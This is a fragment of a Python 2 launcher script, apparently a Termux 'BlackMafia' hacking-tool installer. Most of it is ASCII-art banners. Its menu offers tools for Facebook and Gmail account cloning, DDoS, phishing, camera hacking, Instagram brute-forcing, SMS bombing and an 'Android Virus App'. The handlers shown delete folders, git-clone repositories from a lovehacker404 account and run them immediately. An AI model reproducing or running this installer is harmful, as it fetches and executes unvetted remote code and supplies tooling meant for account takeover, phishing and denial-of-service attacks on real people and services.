logoi = '\n\x1b[1;94m\n  iiii  \n i::::i \n  iiii  \n        \niiiiiii \ni:::::i \n i::::i \n i::::i \n i::::i \n i::::i \n i::::i \n i::::i \ni::::::i\ni::::::i\ni::::::i\niiiiiiii\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logoj = '\n\x1b[1;96m\n          JJJJJJJJJJJ\n          J:::::::::J\n          J:::::::::J\n          JJ:::::::JJ\n            J:::::J  \n            J:::::J  \n            J:::::J  \n            J:::::j  \n            J:::::J  \nJJJJJJJ     J:::::J  \nJ:::::J     J:::::J  \nJ::::::J   J::::::J  \nJ:::::::JJJ:::::::J  \n JJ:::::::::::::JJ   \n   JJ:::::::::JJ     \n     JJJJJJJJJ\n\x1b[1;95m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logok = '\n\x1b[1;96m\nKKKKKKKKK    KKKKKKK\nK:::::::K    K:::::K\nK:::::::K    K:::::K\nK:::::::K   K::::::K\nKK::::::K  K:::::KKK\n  K:::::K K:::::K   \n  K::::::K:::::K    \n  K:::::::::::K     \n  K:::::::::::K     \n  K::::::K:::::K    \n  K:::::K K:::::K   \nKK::::::K  K:::::KKK\nK:::::::K   K::::::K\nK:::::::K    K:::::K\nK:::::::K    K:::::K\nKKKKKKKKK    KKKKKKK\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logol = '\n\x1b[1;96m\nLLLLLLLLLLL             \nL:::::::::L             \nL:::::::::L             \nLL:::::::LL             \n  L:::::L               \n  L:::::L               \n  L:::::L               \n  L:::::L               \n  L:::::L               \n  L:::::L               \n  L:::::L               \n  L:::::L         LLLLLL\nLL:::::::LLLLLLLLL:::::L\nL::::::::::::::::::::::L\nL::::::::::::::::::::::L\nLLLLLLLLLLLLLLLLLLLLLLLL\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logom = '\n\x1b[1;95m\nMMMMMMMM               MMMMMMMM\nM:::::::M             M:::::::M\nM::::::::M           M::::::::M\nM:::::::::M         M:::::::::M\nM::::::::::M       M::::::::::M\nM:::::::::::M     M:::::::::::M\nM:::::::M::::M   M::::M:::::::M\nM::::::M M::::M M::::M M::::::M\nM::::::M  M::::M::::M  M::::::M\nM::::::M   M:::::::M   M::::::M\nM::::::M    M:::::M    M::::::M\nM::::::M     MMMMM     M::::::M\nM::::::M               M::::::M\nM::::::M               M::::::M\nM::::::M               M::::::M\nMMMMMMMM               MMMMMMMM\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logon = '\n\x1b[1;96m\nNNNNNNNN        NNNNNNNN\nN:::::::N       N::::::N\nN::::::::N      N::::::N\nN:::::::::N     N::::::N\nN::::::::::N    N::::::N\nN:::::::::::N   N::::::N\nN:::::::N::::N  N::::::N\nN::::::N N::::N N::::::N\nN::::::N  N::::N:::::::N\nN::::::N   N:::::::::::N\nN::::::N    N::::::::::N\nN::::::N     N:::::::::N\nN::::::N      N::::::::N\nN::::::N       N:::::::N\nN::::::N        N::::::N\nNNNNNNNN         NNNNNNN\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logoo = '\n\x1b[1;96m\n     OOOOOOOOO     \n   OO:::::::::OO   \n OO:::::::::::::OO \nO:::::::OOO:::::::O\nO::::::O   O::::::O\nO:::::O     O:::::O\nO:::::O     O:::::O\nO:::::O     O:::::O\nO:::::O     O:::::O\nO:::::O     O:::::O\nO:::::O     O:::::O\nO::::::O   O::::::O\nO:::::::OOO:::::::O\n OO:::::::::::::OO \n   OO:::::::::OO   \n     OOOOOOOOO  \n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logop = '\n\x1b[1;96m\nPPPPPPPPPPPPPPPPP   \nP::::::::::::::::P  \nP::::::PPPPPP:::::P \nPP:::::P     P:::::P\n  P::::P     P:::::P\n  P::::P     P:::::P\n  P::::PPPPPP:::::P \n  P:::::::::::::PP  \n  P::::PPPPPPPPP    \n  P::::P            \n  P::::P            \n  P::::P            \nPP::::::PP          \nP::::::::P          \nP::::::::P          \nPPPPPPPPPP\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logoq = '\n\x1b[1;96m\n     QQQQQQQQQ      \n   QQ:::::::::QQ    \n QQ:::::::::::::QQ  \nQ:::::::QQQ:::::::Q \nQ::::::O   Q::::::Q \nQ:::::O     Q:::::Q \nQ:::::O     Q:::::Q \nQ:::::O     Q:::::Q \nQ:::::O     Q:::::Q \nQ:::::O     Q:::::Q \nQ:::::O  QQQQ:::::Q \nQ::::::O Q::::::::Q \nQ:::::::QQ::::::::Q \n QQ::::::::::::::Q  \n   QQ:::::::::::Q   \n     QQQQQQQQ::::QQ \n             Q:::::Q\n              QQQQQQ\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logor = '\n\x1b[1;96m\nRRRRRRRRRRRRRRRRR   \nR::::::::::::::::R  \nR::::::RRRRRR:::::R \nRR:::::R     R:::::R\n  R::::R     R:::::R\n  R::::R     R:::::R\n  R::::RRRRRR:::::R \n  R:::::::::::::RR  \n  R::::RRRRRR:::::R \n  R::::R     R:::::R\n  R::::R     R:::::R\n  R::::R     R:::::R\nRR:::::R     R:::::R\nR::::::R     R:::::R\nR::::::R     R:::::R\nRRRRRRRR     RRRRRRR\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logos = '\n\x1b[1;96m\n   SSSSSSSSSSSSSSS \n SS:::::::::::::::S\nS:::::SSSSSS::::::S\nS:::::S     SSSSSSS\nS:::::S            \nS:::::S            \n S::::SSSS         \n  SS::::::SSSSS    \n    SSS::::::::SS  \n       SSSSSS::::S \n            S:::::S\n            S:::::S\nSSSSSSS     S:::::S\nS::::::SSSSSS:::::S\nS:::::::::::::::SS \n SSSSSSSSSSSSSSS\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logot = '\n\x1b[1;96m\nTTTTTTTTTTTTTTTTTTTTTTT\nT:::::::::::::::::::::T\nT:::::::::::::::::::::T\nT:::::TT:::::::TT:::::T\nTTTTTT  T:::::T  TTTTTT\n        T:::::T        \n        T:::::T        \n        T:::::T        \n        T:::::T        \n        T:::::T        \n        T:::::T        \n        T:::::T        \n      TT:::::::TT      \n      T:::::::::T      \n      T:::::::::T      \n      TTTTTTTTTTT\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logou = '\n\x1b[1;96m\nUUUUUUUU     UUUUUUUU\nU::::::U     U::::::U\nU::::::U     U::::::U\nUU:::::U     U:::::UU\n U:::::U     U:::::U \n U:::::D     D:::::U \n U:::::D     D:::::U \n U:::::D     D:::::U \n U:::::D     D:::::U \n U:::::D     D:::::U \n U:::::D     D:::::U \n U::::::U   U::::::U \n U:::::::UUU:::::::U \n  UU:::::::::::::UU  \n    UU:::::::::UU    \n      UUUUUUUUU   \n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logov = '\n\x1b[1;96m\nVVVVVVVV           VVVVVVVV\nV::::::V           V::::::V\nV::::::V           V::::::V\nV::::::V           V::::::V\n V:::::V           V:::::V \n  V:::::V         V:::::V  \n   V:::::V       V:::::V   \n    V:::::V     V:::::V    \n     V:::::V   V:::::V     \n      V:::::V V:::::V      \n       V:::::V:::::V       \n        V:::::::::V        \n         V:::::::V         \n          V:::::V          \n           V:::V           \n            VVV  \n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logow = '\n\x1b[1;96m\nWWWWWWWW                           WWWWWWWW\nW::::::W                           W::::::W\nW::::::W                           W::::::W\nW::::::W                           W::::::W\n W:::::W           WWWWW           W:::::W \n  W:::::W         W:::::W         W:::::W  \n   W:::::W       W:::::::W       W:::::W   \n    W:::::W     W:::::::::W     W:::::W    \n     W:::::W   W:::::W:::::W   W:::::W     \n      W:::::W W:::::W W:::::W W:::::W      \n       W:::::W:::::W   W:::::W:::::W       \n        W:::::::::W     W:::::::::W        \n         W:::::::W       W:::::::W         \n          W:::::W         W:::::W          \n           W:::W           W:::W           \n            WWW             WWW  \n\x1b[1;96m\xc2\xab---------------\x1b[1;91mWhatsApp Group\x1b[1;96m---------------\xc2\xbb'
logox = '\n\x1b[1;96m\nXXXXXXX       XXXXXXX\nX:::::X       X:::::X\nX:::::X       X:::::X\nX::::::X     X::::::X\nXXX:::::X   X:::::XXX\n   X:::::X X:::::X   \n    X:::::X:::::X    \n     X:::::::::X     \n     X:::::::::X     \n    X:::::X:::::X    \n   X:::::X X:::::X   \nXXX:::::X   X:::::XXX\nX::::::X     X::::::X\nX:::::X       X:::::X\nX:::::X       X:::::X\nXXXXXXX       XXXXXXX\n\x1b[1;96m\xc2\xab-------------\x1b[1;91mDownload Virus App\x1b[1;96m--------------\xc2\xbb'
logoy = '\n\x1b[1;96m\n   _     _     _     _     _     _  \n  / \\   / \\   / \\   / \\   / \\   / \\ \n ( U ) ( p ) ( d ) ( a ) ( t ) ( e )\n  \\_/   \\_/   \\_/   \\_/   \\_/   \\_/\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mUpdate Successfully"\x1b[1;96m-----------------\xc2\xbb'
logoz = '\n\x1b[1;96m\n:::::::::: :::    ::: ::::::::::: ::::::::::: \n:+:        :+:    :+:     :+:         :+:     \n+:+         +:+  +:+      +:+         +:+     \n+#++:++#     +#++:+       +#+         +#+     \n+#+         +#+  +#+      +#+         +#+     \n#+#        #+#    #+#     #+#         #+#     \n########## ###    ### ###########     ###\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mExit\x1b[1;96m-----------------\xc2\xbb'
R = '\x1b[1;91m'
G = '\x1b[1;92m'
Y = '\x1b[1;93m'
B = '\x1b[1;94m'
P = '\x1b[1;95m'
S = '\x1b[1;96m'
W = '\x1b[1;97m'

def clear():
    os.system('clear')


def t():
    time.sleep(1)


def t1():
    time.sleep(0.01)


def love(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        t1()


def menu():
    os.system('clear')
    pkgs()
    os.system('clear')
    print logo
    os.system('clear')
    os.system('echo -e "\n \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\n \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xa6\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\n \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\n \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xa6\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\n \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\n \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d" | lolcat ')
    os.system('echo  ------ Your Mind is Your Best Weapon-------\xe2\x97\x8f&&date  | lolcat -a -F 0.1')
    os.system('echo ----------------BlackMafia-----------------\xe2\x97\x8f| lolcat')
    os.system('echo  \xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x97\xa2\xe2\x96\x87\xe2\x97\xa3\xe2\x97\xa2\xe2\x96\x87\xe2\x97\xa3\xe2\x94\x88\xe2\x94\x88\xe2\x97\xa2\xe2\x96\x87\xe2\x97\xa3\xe2\x97\xa2\xe2\x96\x87\xe2\x97\xa3\xe2\x94\x88\xe2\x94\x88\xe2\x97\xa2\xe2\x96\x87\xe2\x97\xa3\xe2\x97\xa2\xe2\x96\x87\xe2\x97\xa3\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88  BlackMafia| lolcat --animate')
    os.system('echo  \xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88  lovehacker| lolcat --animate')
    os.system('echo  \xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x97\xa5\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x97\xa4\xe2\x94\x88\xe2\x94\x88\xe2\x97\xa5\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x97\xa4\xe2\x94\x88\xe2\x94\x88\xe2\x97\xa5\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x97\xa4\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88| lolcat')
    os.system('echo  \xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x97\xa5\xe2\x96\x87\xe2\x96\x87\xe2\x97\xa4\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x97\xa5\xe2\x96\x87\xe2\x96\x87\xe2\x97\xa4\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x97\xa5\xe2\x96\x87\xe2\x96\x87\xe2\x97\xa4\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88   WhatsApp| lolcat --animate')
    os.system('echo  \xe2\x94\x88\xe2\x94\x88-\xcc\xb4\xcd\x97\xcd\x91\xcd\x8c\xcc\x83\xcd\x98\xcc\xbf\xcd\x97\xcc\x88\xcc\xbf\xcc\xbf\xcc\x8f\xcd\x97\xcc\x91\xcd\x80\xcd\x80\xcc\xac\xcd\x96\xcd\x87\xcc\x9f\xcc\x9f\xcc\xbc\xcc\xb1\xcd\x99\xcc\xa0\xcd\x89\xcc\x9f\xcc\xb9\xcc\x98\xcc\x96\xcc\xa5\xcd\x88\xcd\x96\xcc\xa7\xcd\x9a\xcc\xaf\xe2\x94\x88\xe2\x94\x88\xe2\x97\xa5\xe2\x97\xa4\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88-\xcc\xb4\xcd\x97\xcd\x91\xcd\x8c\xcc\x83\xcd\x98\xcc\xbf\xcd\x97\xcc\x88\xcc\xbf\xcc\xbf\xcc\x8f\xcd\x97\xcc\x91\xcd\x80\xcd\x80\xcc\xac\xcd\x96\xcd\x87\xcc\x9f\xcc\x9f\xcc\xbc\xcc\xb1\xcd\x99\xcc\xa0\xcd\x89\xcc\x9f\xcc\xb9\xcc\x98\xcc\x96\xcc\xa5\xcd\x88\xcd\x96\xcc\xa7\xcd\x9a\xcc\xaf\xe2\x94\x88\xe2\x94\x88\xe2\x97\xa5\xe2\x97\xa4\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88-\xcc\xb4\xcd\x97\xcd\x91\xcd\x8c\xcc\x83\xcd\x98\xcc\xbf\xcd\x97\xcc\x88\xcc\xbf\xcc\xbf\xcc\x8f\xcd\x97\xcc\x91\xcd\x80\xcd\x80\xcc\xac\xcd\x96\xcd\x87\xcc\x9f\xcc\x9f\xcc\xbc\xcc\xb1\xcd\x99\xcc\xa0\xcd\x89\xcc\x9f\xcc\xb9\xcc\x98\xcc\x96\xcc\xa5\xcd\x88\xcd\x96\xcc\xa7\xcd\x9a\xcc\xaf\xe2\x94\x88\xe2\x94\x88\xe2\x97\xa5\xe2\x97\xa4\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88-\xcc\xb4\xcd\x97\xcd\x91\xcd\x8c\xcc\x83\xcd\x98\xcc\xbf\xcd\x97\xcc\x88\xcc\xbf\xcc\xbf\xcc\x8f\xcd\x97\xcc\x91\xcd\x80\xcd\x80\xcc\xac\xcd\x96\xcd\x87\xcc\x9f\xcc\x9f\xcc\xbc\xcc\xb1\xcd\x99\xcc\xa0\xcd\x89\xcc\x9f\xcc\xb9\xcc\x98\xcc\x96\xcc\xa5\xcd\x88\xcd\x96\xcc\xa7\xcd\x9a\xcc\xaf\xe2\x94\x88\xe2\x94\x88\xe2\x94\x8803094161457| lolcat --animate')
    os.system('echo -----------------BlackMafia----------------\xe2\x97\x8f| lolcat --animate')
    os.system('echo ---  To return to this menu from any Tool---\xe2\x97\x8f| lolcat --animate')
    time.sleep(0.0005)
    os.system('echo -------- Stop Process Press. CTRL + z -----\xe2\x97\x8f| lolcat --animate')
    time.sleep(0.0005)
    os.system('echo ---------- Type python2 Cloning.py --------\xe2\x97\x8f| lolcat --animate')
    os.system('echo -----------------BlackMafia----------------\xe2\x97\x8f| lolcat --animate')
    time.sleep(0.0005)
    os.system('echo -e " [A1] Install Facebook Extantion  Tool ----\xe2\x97\x8f\n [B2] Install Fb Follower Cloning Tool ----\xe2\x97\x8f\n [C3] Install Ddos Attack ------- Tool ----\xe2\x97\x8f\n [D4] Install Phishing Attack---- Tool ----\xe2\x97\x8f\n [E5] Install G.f Camera Hack---- Tool ----\xe2\x97\x8f\n [F6] Install Fb UserName Cloning Tool ----\xe2\x97\x8f\n [G7] Install Pubg Game Phishing  Tool ----\xe2\x97\x8f\n  [A] Install Random Mail Cloning Tool ----\xe2\x97\x8f\n  [B] Install Email Cloning------ Tool ----\xe2\x97\x8f\n  [C] Install Manual Password---- Tool ----\xe2\x97\x8f\n  [D] Install Group Cloning------ Tool ----\xe2\x97\x8f\n  [E] Install With Out Fb Id----- Tool ----\xe2\x97\x8f\n  [F] Install Facebook Target---- Tool ----\xe2\x97\x8f\n  [G] Install SpiderMan---------- Tool ----\xe2\x97\x8f\n  [H] Install Kalilinux---------- Tool ----\xe2\x97\x8f\n  [I] Install BlackHat----------- Tool ----\xe2\x97\x8f\n  [J] Install RedMoonNew--------- Tool ----\xe2\x97\x8f\n  [K] Install love3Hack3r-------- Tool ----\xe2\x97\x8f\n  [L] Install Cobra-------------- Tool ----\xe2\x97\x8f\n  [M] Install Dragon------------- Tool ----\xe2\x97\x8f\n  [N] Install NetHunting--------- Tool ----\xe2\x97\x8f\n  [O] Install Payload------------ Tool ----\xe2\x97\x8f\n  [P] Install CamHacker---------- Tool ----\xe2\x97\x8f\n  [Q] Install Compiler----------- Tool ----\xe2\x97\x8f\n  [R] Install Instagram Brut----- Tool ----\xe2\x97\x8f\n  [S] Install Marsh Base--------- Tool ----\xe2\x97\x8f\n  [T] Install Gmail Target------- Tool ----\xe2\x97\x8f\n  [U] Install Termux Logo-------- Tool ----\xe2\x97\x8f\n  [V] Install Termux TBomb------- Tool ----\xe2\x97\x8f\n  [W] BlackMafia New WhatsApp Group--------\xe2\x97\x8f\n  [X] BlackMafia Android Virus App --------\xe2\x97\x8f\n  [Y] Tool Update--------------------------\xe2\x97\x8f\n  [Z] EXIT\n  Slect Any Option A-Z\xe2\x9e\xa3\xe2\x9e\xa4" | lolcat ')
    mafia()


def mafia():
    black = raw_input('\x1b[1;91m  \xe2\x94\xba\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\x1b[1;97m\xe2\x94\x80\xe2\x94\x80\x1b[1;96m\xe2\x94\x80\xe2\x94\x80\x1b[1;95m\xe2\x94\x80\xe2\x94\x80\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\x1b[1;96m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x81\x1b[1;93m\xe2\x9e\xa2\x1b[1;92m\xe2\x9e\xa3\x1b[1;91m\xe2\x9e\xa4\xe2\x9e\xa4\xe2\x9e\xa4\xe2\x9e\xa4\xe2\x9e\xa4')
    if black == '':
        print '  BlackMafia!'
        mafia()
    elif black == 'A1' or black == 'a1':
        clear()
        print logoa1
        os.system('rm -rf $HOME/Extantion')
        os.system('cd $HOME && git clone https://github.com/lovehacker404/Extantion')
        os.system('cd $HOME/Extantion && python2 lovehacker.py')
    elif black == 'B2' or black == 'b2':
        clear()
        print logob2
        os.system('rm -rf $HOME/BlackMafiaTool')
        os.system('cd $HOME && git clone https://github.com/lovehacker404/BlackMafiaTool')
        os.system('cd $HOME/BlackMafiaTool && python2 lovehacker.py')
    elif black == 'C3' or black == 'c3':
        clear()
        print logoc3#Hunterboy alamin
        os.system('rm -rf $HOME/DdosAttack')
        os.system('cd $HOME && git clone https://github.com/lovehacker404/DdosAttack')
        os.system('cd $HOME/DdosAttack && python2 Ddos.py')
